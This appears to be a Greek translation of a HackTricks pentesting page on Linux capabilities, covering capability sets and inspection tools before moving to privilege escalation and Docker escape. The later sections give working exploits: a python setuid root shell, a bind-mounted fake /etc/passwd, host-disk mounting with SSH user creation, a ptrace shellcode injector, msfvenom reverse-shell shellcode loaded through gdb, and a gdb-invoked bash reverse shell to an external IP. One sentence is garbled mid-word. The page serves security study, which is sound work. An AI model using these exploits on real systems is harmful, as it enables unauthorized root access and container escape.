# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Οι Linux capabilities χωρίζουν τα **δικαιώματα root σε μικρότερες, διακριτές μονάδες**, επιτρέποντας στις διεργασίες να διαθέτουν ένα υποσύνολο δικαιωμάτων. Αυτό ελαχιστοποιεί τους κινδύνους, καθώς δεν εκχωρούνται πλήρη δικαιώματα root χωρίς να είναι απαραίτητο.

### Το πρόβλημα:

- Οι κανονικοί χρήστες έχουν περιορισμένα δικαιώματα, γεγονός που επηρεάζει εργασίες όπως το άνοιγμα ενός network socket, το οποίο απαιτεί πρόσβαση root.

### Σύνολα capabilities:

1. **Inherited (CapInh)**:

- **Σκοπός**: Καθορίζει τις capabilities που μεταβιβάζονται από τη γονική διεργασία.
- **Λειτουργικότητα**: Όταν δημιουργείται μια νέα διεργασία, κληρονομεί τις capabilities της γονικής διεργασίας από αυτό το σύνολο. Είναι χρήσιμο για τη διατήρηση συγκεκριμένων δικαιωμάτων κατά τη δημιουργία διεργασιών.
- **Περιορισμοί**: Μια διεργασία δεν μπορεί να αποκτήσει capabilities που δεν διέθετε η γονική της διεργασία.

2. **Effective (CapEff)**:

- **Σκοπός**: Αντιπροσωπεύει τις πραγματικές capabilities που χρησιμοποιεί μια διεργασία ανά πάσα στιγμή.
- **Λειτουργικότητα**: Είναι το σύνολο των capabilities που ελέγχει ο kernel για να εκχωρήσει δικαιώματα σε διάφορες λειτουργίες. Για αρχεία, αυτό το σύνολο μπορεί να είναι μια σημαία που υποδεικνύει αν οι permitted capabilities του αρχείου θα θεωρούνται effective.
- **Σημασία**: Το effective σύνολο είναι κρίσιμο για τους άμεσους ελέγχους δικαιωμάτων, λειτουργώντας ως το ενεργό σύνολο capabilities που μπορεί να χρησιμοποιήσει μια διεργασία.

3. **Permitted (CapPrm)**:

- **Σκοπός**: Καθορίζει το μέγιστο σύνολο capabilities που μπορεί να διαθέτει μια διεργασία.
- **Λειτουργικότητα**: Μια διεργασία μπορεί να ανυψώσει μια capability από το permitted σύνολό της στο effective σύνολό της, αποκτώντας τη δυνατότητα να τη χρησιμοποιήσει. Μπορεί επίσης να αφαιρέσει capabilities από το permitted σύνολό της.
- **Όριο**: Λειτουργεί ως ανώτατο όριο για τις capabilities που μπορεί να διαθέτει μια διεργασία, διασφαλίζοντας ότι δεν υπερβαίνει το προκαθορισμένο πεδίο δικαιωμάτων της.

4. **Bounding (CapBnd)**:

- **Σκοπός**: Θέτει ένα ανώτατο όριο στις capabilities που μπορεί να αποκτήσει ποτέ μια διεργασία κατά τη διάρκεια του κύκλου ζωής της.
- **Λειτουργικότητα**: Ακόμη και αν μια διεργασία διαθέτει μια συγκεκριμένη capability στο inheritable ή permitted σύνολό της, δεν μπορεί να την αποκτήσει αν δεν βρίσκεται επίσης στο bounding σύνολο.
- **Περίπτωση χρήσης**: Αυτό το σύνολο είναι ιδιαίτερα χρήσιμο για τον περιορισμό της δυνατότητας privilege escalation μιας διεργασίας, προσθέτοντας ένα επιπλέον επίπεδο ασφάλειας.

5. **Ambient (CapAmb)**:
- **Σκοπός**: Επιτρέπει τη διατήρηση συγκεκριμένων capabilities κατά τη διάρκεια μιας system call `execve`, η οποία κανονικά θα είχε ως αποτέλεσμα την πλήρη επαναφορά των capabilities της διεργασίας.
- **Λειτουργικότητα**: Διασφαλίζει ότι προγράμματα που δεν είναι SUID και δεν διαθέτουν συσχετισμένες file capabilities μπορούν να διατηρούν συγκεκριμένα δικαιώματα.
- **Περιορισμοί**: Οι capabilities σε αυτό το σύνολο υπόκεινται στους περιορισμούς των inheritable και permitted συνόλων, διασφαλίζοντας ότι δεν υπερβαίνουν τα επιτρεπόμενα δικαιώματα της διεργασίας.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Για περισσότερες πληροφορίες, ελέγξτε:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capabilities Διεργασιών & Binaries

### Capabilities Διεργασιών

Για να δείτε τα capabilities μιας συγκεκριμένης διεργασίας, χρησιμοποιήστε το αρχείο **status** στον κατάλογο /proc. Καθώς παρέχει περισσότερες λεπτομέρειες, ας περιοριστούμε μόνο στις πληροφορίες που σχετίζονται με τα Linux capabilities.\
Σημειώστε ότι για όλες τις εκτελούμενες διεργασίες, οι πληροφορίες των capabilities διατηρούνται ανά thread, ενώ για τα binaries στο σύστημα αρχείων αποθηκεύονται σε extended attributes.

Μπορείτε να βρείτε τα capabilities που ορίζονται στο /usr/include/linux/capability.h

Μπορείτε να βρείτε τα capabilities της τρέχουσας διεργασίας με `cat /proc/self/status` ή εκτελώντας `capsh --print`, ενώ των άλλων χρηστών στο `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Αυτή η εντολή θα πρέπει να επιστρέφει 5 γραμμές στα περισσότερα συστήματα.

- CapInh = Κληρονομημένες capabilities
- CapPrm = Επιτρεπόμενες capabilities
- CapEff = Ενεργές capabilities
- CapBnd = Bounding set
- CapAmb = Σύνολο Ambient capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Αυτοί οι δεκαεξαδικοί αριθμοί δεν βγάζουν νόημα. Χρησιμοποιώντας το utility capsh, μπορούμε να τους αποκωδικοποιήσουμε στα ονόματα των capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Ας ελέγξουμε τώρα τα **capabilities** που χρησιμοποιούνται από το `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Παρόλο που αυτό λειτουργεί, υπάρχει ένας ακόμη και ευκολότερος τρόπος. Για να δείτε τις capabilities μιας εκτελούμενης διεργασίας, απλώς χρησιμοποιήστε το εργαλείο **getpcaps** ακολουθούμενο από το process ID (PID) της. Μπορείτε επίσης να παρέχετε μια λίστα με process IDs.
```bash
getpcaps 1234
```
Ας ελέγξουμε εδώ τις capabilities του `tcpdump`, αφού παραχωρήσαμε στο binary επαρκείς capabilities (`cap_net_admin` και `cap_net_raw`) για να κάνει sniffing στο network (_το `tcpdump` εκτελείται στη διεργασία 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Όπως μπορείτε να δείτε, τα capabilities που δίνονται αντιστοιχούν στα αποτελέσματα των 2 τρόπων λήψης των capabilities ενός binary.\
Το εργαλείο _getpcaps_ χρησιμοποιεί το system call **capget()** για να αναζητήσει τα διαθέσιμα capabilities για ένα συγκεκριμένο thread. Αυτό το system call χρειάζεται μόνο το PID για να λάβει περισσότερες πληροφορίες.

### Capabilities Binaries

Τα binaries μπορούν να έχουν capabilities που μπορούν να χρησιμοποιηθούν κατά την εκτέλεσή τους. Για παράδειγμα, είναι πολύ συνηθισμένο να βρείτε το `ping` binary με το capability `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Μπορείτε να **αναζητήσετε binaries με capabilities** χρησιμοποιώντας:
```bash
getcap -r / 2>/dev/null
```
### Αφαίρεση capabilities με capsh

Αν αφαιρέσουμε τις capabilities CAP*NET_RAW από το \_ping*, τότε το utility ping δεν θα πρέπει πλέον να λειτουργεί.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Εκτός από την έξοδο του ίδιου του _capsh_, και η ίδια η εντολή _tcpdump_ θα πρέπει να εμφανίσει σφάλμα.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Το σφάλμα δείχνει ξεκάθαρα ότι η εντολή ping δεν επιτρέπεται να ανοίξει socket ICMP. Τώρα γνωρίζουμε με βεβαιότητα ότι αυτό λειτουργεί όπως αναμένεται.

### Αφαίρεση Capabilities

Μπορείτε να αφαιρέσετε capabilities από ένα binary με
```bash
setcap -r </path/to/binary>
```
## Capabilities χρηστών

Apparently **είναι επίσης δυνατό να εκχωρηθούν capabilities σε users**. Αυτό πιθανότατα σημαίνει ότι κάθε process που εκτελείται από τον user θα μπορεί να χρησιμοποιεί τα capabilities του user.\
Με βάση [αυτό](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [αυτό ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)και [αυτό ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), πρέπει να ρυθμιστούν μερικά αρχεία για να δοθούν συγκεκριμένα capabilities σε έναν user, όμως το αρχείο που εκχωρεί τα capabilities σε κάθε user είναι το `/etc/security/capability.conf`.\
Παράδειγμα αρχείου:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities Περιβάλλοντος

Με τη μεταγλώττιση του παρακάτω προγράμματος είναι δυνατή η **εκκίνηση ενός bash shell μέσα σε ένα περιβάλλον που παρέχει capabilities**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Μέσα στο **bash που εκτελείται από το μεταγλωττισμένο ambient binary** είναι δυνατό να παρατηρηθούν τα **new capabilities** (ένας κανονικός χρήστης δεν θα έχει κανένα capability στην ενότητα "current").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Μπορείτε να **προσθέσετε μόνο capabilities που υπάρχουν** τόσο στα permitted όσο και στα inheritable sets.

### Capability-aware/Capability-dumb binaries

Τα **capability-aware binaries δεν θα χρησιμοποιήσουν τα νέα capabilities** που παρέχονται από το environment, ενώ τα **capability-dumb binaries θα τα χρησιμοποιήσουν**, καθώς δεν θα τα απορρίψουν. Αυτό καθιστά τα capability-dumb binaries ευάλωτα μέσα σε ένα ειδικό environment που παρέχει capabilities στα binaries.

## Service Capabilities

Από προεπιλογή, ένα **service που εκτελείται ως root θα έχει εκχωρημένα όλα τα capabilities**, και σε ορισμένες περιπτώσεις αυτό μπορεί να είναι επικίνδυνο.\
Επομένως, ένα **service configuration** file επιτρέπει να **καθορίσετε** τα **capabilities** που θέλετε να διαθέτει, καθώς και τον **user** που πρέπει να εκτελεί το service, ώστε να αποφεύγεται η εκτέλεση ενός service με περιττά privileges:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities σε Docker Containers

Από προεπιλογή, το Docker εκχωρεί μερικές capabilities στα containers. Είναι πολύ εύκολο να ελέγξετε ποιες capabilities είναι αυτές εκτελώντας:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Τα Capabilities είναι χρήσιμα όταν **θέλετε να περιορίσετε τα δικά σας processes μετά την εκτέλεση privileged operations** (π.χ. μετά τη ρύθμιση του chroot και τη σύνδεση σε ένα socket). Ωστόσο, μπορούν να γίνουν αντικείμενο εκμετάλλευσης μέσω της传?....
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Το `+ep` σημαίνει ότι προσθέτετε το capability (`-` θα το αφαιρούσε) ως Effective και Permitted.

Για να εντοπίσετε προγράμματα σε ένα σύστημα ή φάκελο με capabilities:
```bash
getcap -r / 2>/dev/null
```
### Παράδειγμα exploitation

Στο ακόλουθο παράδειγμα, το binary `/usr/bin/python2.6` εντοπίζεται ως ευάλωτο σε privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** που χρειάζεται το `tcpdump` για να **επιτρέπει σε οποιονδήποτε χρήστη να υποκλέπτει πακέτα**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Η ειδική περίπτωση των "κενών" capabilities

[Από το documentation](https://man7.org/linux/man-pages/man7/capabilities.7.html): Σημειώστε ότι είναι δυνατή η αντιστοίχιση κενών capability sets σε ένα program file, και συνεπώς είναι δυνατή η δημιουργία ενός set-user-ID-root program που αλλάζει το effective και saved set-user-ID του process που εκτελεί το program σε 0, αλλά δεν παρέχει capabilities σε αυτό το process. Ή, με απλά λόγια, αν έχετε ένα binary που:

1. δεν ανήκει στον root
2. δεν έχει ορισμένα τα bits `SUID`/`SGID`
3. έχει κενό capabilities set (π.χ.: το `getcap myelf` επιστρέφει `myelf =ep`)

τότε **αυτό το binary θα εκτελεστεί ως root**.

## CAP_SYS_ADMIN

Το **[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** είναι ένα ιδιαίτερα ισχυρό Linux capability, το οποίο συχνά εξισώνεται με σχεδόν root-level privilege λόγω των εκτεταμένων **administrative privileges** του, όπως το mounting devices ή η τροποποίηση kernel features. Παρότι είναι απαραίτητο για containers που προσομοιώνουν ολόκληρα systems, το **`CAP_SYS_ADMIN` προκαλεί σημαντικές security challenges**, ειδικά σε containerized environments, λόγω της πιθανότητας για privilege escalation και system compromise. Επομένως, η χρήση του απαιτεί αυστηρά security assessments και προσεκτική διαχείριση, με έντονη προτίμηση στην αφαίρεση αυτού του capability από application-specific containers, ώστε να τηρείται η **principle of least privilege** και να ελαχιστοποιείται το attack surface.

**Παράδειγμα με binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Με τη χρήση της python μπορείτε να προσαρτήσετε ένα τροποποιημένο αρχείο _passwd_ πάνω από το πραγματικό αρχείο _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Και τέλος, κάντε **mount** το τροποποιημένο αρχείο `passwd` στο `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Και θα μπορείτε να κάνετε **`su` ως root** χρησιμοποιώντας τον κωδικό πρόσβασης "password".

**Παράδειγμα με περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο Docker container χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στο προηγούμενο output μπορείτε να δείτε ότι το capability SYS_ADMIN είναι ενεργοποιημένο.

- **Mount**

Αυτό επιτρέπει στο docker container να **κάνει mount τον δίσκο του host και να έχει ελεύθερη πρόσβαση σε αυτόν**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Πλήρης πρόσβαση**

Στην προηγούμενη μέθοδο καταφέραμε να αποκτήσουμε πρόσβαση στον δίσκο του docker host.\
Σε περίπτωση που διαπιστώσετε ότι το host εκτελεί έναν **ssh** server, θα μπορούσατε να **δημιουργήσετε έναν χρήστη μέσα στον δίσκο του docker host** και να αποκτήσετε πρόσβαση σε αυτόν μέσω SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Αυτό σημαίνει ότι μπορείτε να διαφύγετε από το container εισάγοντας ένα shellcode μέσα σε κάποια διεργασία που εκτελείται στο host.** Για την πρόσβαση σε διεργασίες που εκτελούνται στο host, το container πρέπει να εκτελείται τουλάχιστον με **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** παρέχει τη δυνατότητα χρήσης λειτουργιών debugging και system call tracing που παρέχονται από τα `ptrace(2)` και cross-memory attach calls, όπως τα `process_vm_readv(2)` και `process_vm_writev(2)`. Παρότι είναι ισχυρό για σκοπούς διάγνωσης και monitoring, αν το `CAP_SYS_PTRACE` είναι ενεργοποιημένο χωρίς περιοριστικά μέτρα, όπως ένα seccomp filter στο `ptrace(2)`, μπορεί να υπονομεύσει σημαντικά την ασφάλεια του συστήματος. Συγκεκριμένα, μπορεί να γίνει exploit για την παράκαμψη άλλων περιορισμών ασφαλείας, ιδίως εκείνων που επιβάλλονται από το seccomp, όπως αποδεικνύεται από [proofs of concept (PoC) όπως αυτό](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Παράδειγμα με binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Παράδειγμα με binary (gdb)**

`gdb` με capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Δημιουργία shellcode με το msfvenom για inject στη μνήμη μέσω του gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Κάντε debug μια root process με το gdb και κάντε copy-paste τις γραμμές gdb που δημιουργήθηκαν προηγουμένως:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Example with environment (Docker breakout) - Another gdb Abuse**

Αν το **GDB** είναι εγκατεστημένο (ή μπορείτε να το εγκαταστήσετε με `apk add gdb` ή `apt install gdb`, για παράδειγμα), μπορείτε να κάνετε **debug σε ένα process από το host** και να το κάνετε να καλέσει τη συνάρτηση `system`. (Αυτή η τεχνική απαιτεί επίσης το capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Δεν θα μπορείτε να δείτε την έξοδο της εντολής που εκτελείται, αλλά θα εκτελεστεί από εκείνη τη διεργασία (οπότε αποκτήστε ένα rev shell).

> [!WARNING]
> Αν λάβετε το σφάλμα "No symbol "system" in current context.", ελέγξτε το προηγούμενο παράδειγμα φόρτωσης ενός shellcode σε ένα πρόγραμμα μέσω του gdb.

**Παράδειγμα με environment (Docker breakout) - Shellcode Injection**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
